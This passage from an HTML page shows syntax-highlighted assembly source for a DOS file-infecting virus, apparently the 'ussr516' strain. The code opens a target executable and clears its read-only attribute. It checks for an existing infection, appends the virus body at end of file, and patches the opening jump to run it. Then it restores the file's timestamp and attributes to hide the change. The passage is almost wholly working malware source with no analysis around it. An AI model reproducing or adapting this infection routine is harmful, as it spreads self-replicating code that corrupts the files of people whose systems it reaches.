                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int24</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                       </span><span class="sc1">;Set to new one</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                       </span><span class="sc1">;Get attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21DSDX</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc0">
</span><span class="sc5">doneinfect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                       </span><span class="sc1">;Restore crit error</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;handler</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">callorig21</span><span class="sc0">               </span><span class="sc1">;Call orig handler</span><span class="sc0">
</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;Save attributes</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;Check if r/o????</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">noclearattr</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                       </span><span class="sc1">;Clear attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21DSDX</span><span class="sc0">                      </span><span class="sc1">;Filename in DS:DX</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">doneinfect</span><span class="sc0">                     </span><span class="sc1">;Quit on error</span><span class="sc0">
</span><span class="sc5">noclearattr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                       </span><span class="sc1">;Open read/write</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21DSDX</span><span class="sc0">                      </span><span class="sc1">;Filename in DS:DX</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">doneinfect</span><span class="sc0">                     </span><span class="sc1">;Exit if error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                       </span><span class="sc1">;Save time/date</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                         </span><span class="sc1">;Read 4 bytes to</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                          </span><span class="sc1">;buffer</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">quitinf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc1">;Must start with 0E9h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">quitinf</span><span class="sc0">                        </span><span class="sc1">;Otherwise, quit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc1">;dx = jmploc</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                       </span><span class="sc1">;go there</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;new location offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">orig4</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                         </span><span class="sc1">;Read 4 bytes there</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig4</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                        </span><span class="sc1">;0E9h means we might</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">                         </span><span class="sc1">;already be there</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;continue checking</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                          </span><span class="sc1">;to see if we really</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                          </span><span class="sc1">;are there.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">quitinf</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                       </span><span class="sc1">;Go to EOF</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;save filesize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">204h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">;Write virus</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">quitinf</span><span class="sc0">                        </span><span class="sc1">;Exit if error</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">quitinf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;AX-&gt;jmp offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc1">;Set up buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc1">;code the jmp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                       </span><span class="sc1">;Rewind to jmploc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">;Write in the jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
</span><span class="sc5">quitinf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                       </span><span class="sc1">;Restore date/time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                         </span><span class="sc1">;Close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;Restore attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21DSDX</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">doneinfect</span><span class="sc0">                     </span><span class="sc1">;Return</span><span class="sc0">
</span><span class="sc5">ussr516</span><span class="sc0">         </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">stub</span></div></body>
</html>
